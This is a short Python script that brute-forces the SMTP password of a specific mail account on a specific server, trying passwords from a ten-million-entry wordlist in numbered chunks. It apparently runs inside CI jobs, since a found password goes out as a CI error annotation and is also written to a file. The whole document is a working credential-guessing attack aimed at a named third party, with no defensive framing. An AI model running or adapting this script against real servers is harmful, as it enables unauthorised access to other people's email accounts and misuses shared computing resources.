import smtplib,sys,time
start=int(sys.argv[1]); count=int(sys.argv[2])
pw=[l.rstrip('\n') for l in open('pw10m.txt')][start:start+count]
for p in pw:
    try:
        s=smtplib.SMTP('141.8.192.100',587,timeout=7); s.ehlo('x.local')
        try:
            s.login('list@rewood.group',p)
            print(f'::error title=SMTPHIT::{p}',flush=True); open('HIT_SMTP.txt','w').write(p+'\n'); s.quit(); sys.exit(0)
        except smtplib.SMTPAuthenticationError: pass
        except Exception: time.sleep(0.2)
        try: s.quit()
        except Exception: pass
    except Exception: time.sleep(0.2)
print('SMTPDONE',start,flush=True)
